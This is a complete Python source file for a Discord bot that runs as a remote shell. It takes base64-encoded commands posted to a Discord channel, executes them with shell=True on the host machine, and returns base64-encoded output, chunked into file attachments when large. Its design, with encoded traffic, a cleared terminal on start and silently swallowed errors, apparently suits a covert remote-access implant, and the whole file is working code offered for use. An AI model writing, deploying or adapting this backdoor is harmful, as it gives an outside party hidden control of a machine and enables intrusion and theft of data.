import discord
from discord.ext import commands
import subprocess
import base64
import io
import os

SERVER_ID = 
CHANNEL_ID = 
TOKEN = ""

intents = discord.Intents.default()
intents.message_content = True
bot = commands.Bot(command_prefix="!", intents=intents)

current_dir = os.path.expanduser("~")

CHUNK_SIZE = 5_000_000 

async def send_output(channel, output: str):
    raw = output.encode()
    encoded = base64.b64encode(raw).decode()

    if len(encoded) < 1900:
        await channel.send(f"OUT::{encoded}")
        return

    chunks = [raw[i:i + CHUNK_SIZE] for i in range(0, len(raw), CHUNK_SIZE)]
    total = len(chunks)

    for idx, chunk in enumerate(chunks, start=1):
        chunk_encoded = base64.b64encode(chunk).decode()
        file_bytes = io.BytesIO(chunk_encoded.encode())
        await channel.send(
            f"OUTFILE::{idx}/{total}",
            file=discord.File(file_bytes, filename=f"output_{idx}of{total}.b64"),
        )

@bot.event
async def on_ready():
    os.system("clear")

@bot.event
async def on_message(message):
    global current_dir
    if message.channel.id != CHANNEL_ID:
        return

    if message.content == "PING::":
        await message.channel.send("PONG::")
        return

    command = None

    if message.content.startswith("CMD::"):
        encoded = message.content[len("CMD::"):]
        command = base64.b64decode(encoded).decode(errors="replace")

    elif message.content.startswith("CMDFILE::") and message.attachments:
        data = await message.attachments[0].read()
        encoded = data.decode()
        command = base64.b64decode(encoded).decode(errors="replace")

    else:
        return

    stripped = command.strip()

    if stripped == "cd" or stripped.startswith("cd "):
        target = stripped[2:].strip() or os.path.expanduser("~")
        target = os.path.expanduser(target)
        new_dir = os.path.normpath(os.path.join(current_dir, target))
        if os.path.isdir(new_dir):
            current_dir = new_dir
            output = current_dir
        else:
            output = f"cd: no such directory: {target}"
        await send_output(message.channel, output)
        return

    try:
        result = subprocess.run(
            command,
            shell=True,
            capture_output=True,
            text=True,
            cwd=current_dir,
            timeout=20,
        )
        output = result.stdout + result.stderr
        if not output.strip():
            output = "(no output)"
    except subprocess.TimeoutExpired:
        output = "(command timed out after 20s — likely an interactive program like nano/vim/top, which won't work here)"

    await send_output(message.channel, output)

try:
    bot.run(TOKEN, log_handler=None)
except Exception:
    pass
